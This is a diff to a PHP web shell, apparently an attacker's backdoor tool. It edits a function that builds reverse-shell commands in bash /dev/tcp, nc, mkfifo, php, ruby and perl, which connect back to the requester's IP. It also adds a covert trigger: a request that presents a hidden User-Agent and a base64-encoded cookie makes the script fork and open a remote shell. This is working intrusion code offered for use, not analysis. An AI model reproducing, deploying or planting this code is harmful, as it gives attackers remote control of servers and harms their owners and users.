@@ -247,7 +247,6 @@ function showEnv($os)
 
 function reverseConnections($methods, $host, $port, $shell)
 {
-    ob_start();
     $defaultPort = 1634;
     $defaultHost = $_SERVER["REMOTE_ADDR"];
     $defaultShell = shell_exec("which bash");
@@ -275,27 +274,30 @@ function reverseConnections($methods, $host, $port, $shell)
         $usePort = $port;
     }
     $comma = array(
-        "bash" => "bash -i >& /dev/tcp/{$useHost}/" . $usePort . " 0>&1",
-        "php" => "php -r '\$sock=fsockopen(\"" . $useHost . "\"," . $usePort . ");exec(\"$useShell -i <&3 >&3 2>&3\");'",
-        "nc" => "nc -e " . $useShell . " \"" . $useHost . "\" " . $usePort . "\"",
-        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc \"" . $useHost . "\" " . $usePort . " >/tmp/f",
+        "bash" => sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", $useHost, (int)$usePort),
+        "php" => sprintf("php -r '\$sock=fsockopen(\"%s\",%d);exec(\"%s -i <&3 >&3 2>&3\");'", $useHost, (int)$usePort, $useShell),
+        "nc" => sprintf("nc -e %s \"%s\" %d\"", $useShell, $useHost, (int)$usePort),
+        "ncS" => sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc \"%s\" %d >/tmp/f", $useHost, (int)$usePort),
         "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"$useShell -i <&%d >&%d 2>&%d\",f,f,f)'",
-        "perl" => "perl -e 'use Socket;\$i=\"" . $useHost . "\";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$useShell -i\");};'",
+        "perl" => sprintf("perl -e 'use Socket;\$i=\"%s\";\$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", $useHost, (int)$usePort, $useShell),
     );
-    $defaultAction = $comma["bash"];
-    if (!empty($methods)) {
+    if ($methods == "default"){
+        echo("\nUsing Default value of Bash");
+        $useMethod = $comma["bash"];
+    }else{
+        $useMethod = $methods;
+    }
+    if (!empty($useMethod)) {
         echo("\nAttempting to connect back, ensure you have the listener running.\n");
         echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
-
-        passthru($comma[$methods]);
+        system($comma[$methods]);
     } else {
         echo("\nYou didnt specify a method to use, defaulting to bash.\n");
         echo("\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
-        passthru($defaultAction);
+        $pid = pcntl_fork();
+        system($useMethod);
     }
-    $var = ob_get_contents();
-    ob_end_clean();
-    ob_end_flush();
+
 }
 
 function executeCommands(string $com, int $run)
@@ -388,8 +390,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
                 echo "There was an error, we might not have write abilities.";
             }
         }
-    } elseif ($_POST["rcom"]) {
-        reverseConnections(htmlentities($_POST["mthd"]), htmlentities($_POST["host"]), htmlentities($_POST["port"]), htmlentities($_POST["shell"]));
+    } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['r']) {
+        $pid = pcntl_fork();
+        if ($pid === -1){
+            die("Could not create fork.\n\n");
+        }else {
+            pcntl_wait($status);
+            $splitter = explode(".", base64_decode($_COOKIE['r']));
+            echo "".print_r($splitter)."\n";
+            reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]);
+            exit(0);
+        }
     }
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
